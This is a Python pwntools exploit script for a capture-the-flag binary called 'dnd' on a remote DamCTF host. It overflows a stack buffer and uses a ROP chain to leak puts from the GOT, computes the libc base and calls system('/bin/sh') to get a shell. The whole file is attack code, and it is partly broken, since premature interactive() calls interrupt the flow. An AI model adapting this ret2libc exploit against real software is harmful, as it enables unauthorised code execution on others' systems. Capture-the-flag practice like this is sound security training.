from pwn import *

# Set up logging
context.log_level = 'info'
context.arch = 'amd64'
binary = './dnd_patched'
elf = ELF(binary)
s = '''
b * 0x40295f
'''

# Choose local or remote
LOCAL = True
if LOCAL:
    libc = ELF('./libc.so.6')
else:
    libc = ELF('./libc.so.6')

# Gadgets
POP_RDI = 0x402640  # pop rdi ; nop ; pop rbp ; ret

def exploit():
    p = remote('dnd.chals.damctf.xyz', 30813)
    
    # Try to reach the win function by sending 'a' repeatedly
    while True:
        try:
            # Send 3 attacks and check for name prompt
            for _ in range(3):
                p.send(b"a", timeout=1)
            
            # Check if we reached the name prompt
            if p.recvuntil(b"What is your name", timeout=0.1):
                log.success("Reached the win function!")
                break
        except:
            # If we didn't reach the prompt or got an error, restart
            p.close()
            p = remote('dnd.chals.damctf.xyz', 30813)
    
    # First stage: Leak libc address
    padding = b"A" * 0x68  # 0x60 bytes to saved rbp + 8 bytes for saved rbp
    p.interactive()
    # Let's check these addresses again
    puts_plt = elf.plt['puts']  # Using a more typical PLT address
    puts_got = elf.got['puts']  # Using a more typical GOT address
    win_addr = 0x40286d
    ret = 0x000000000040201a
    # First payload: leak puts address and return to win
    #gdb.attach(p, s)
    payload1 = padding + p64(POP_RDI) + p64(puts_got) + p64(0xdeadbeef) + p64(puts_plt) + p64(win_addr)
    
    p.sendline(payload1)
    p.interactive()	
    # Receive the leaked address
    p.recvline()  # Skip the "We will remember you" line
    leak = p.recvline().strip()
    puts_leak = u64(leak.ljust(8, b"\x00"))
    log.info(f"Leaked puts address: {hex(puts_leak)}")
       
    # Calculate libc base
    libc.address = puts_leak - libc.sym['puts']
    log.info(f"Libc base: {hex(libc.address)}")
    
    # Second stage: get shell
    p.recvuntil(b"What is your name, fierce warrior?")
    
    # Craft ROP chain for system("/bin/sh")
    system_addr = libc.sym['system']
    bin_sh = next(libc.search(b'/bin/sh'))
    
    payload2 = padding + p64(POP_RDI) + p64(bin_sh) + p64(0xdeadbeef) + p64(ret) + p64(system_addr)
    
    p.sendline(payload2)
    p.interactive()

if __name__ == "__main__":
    exploit()
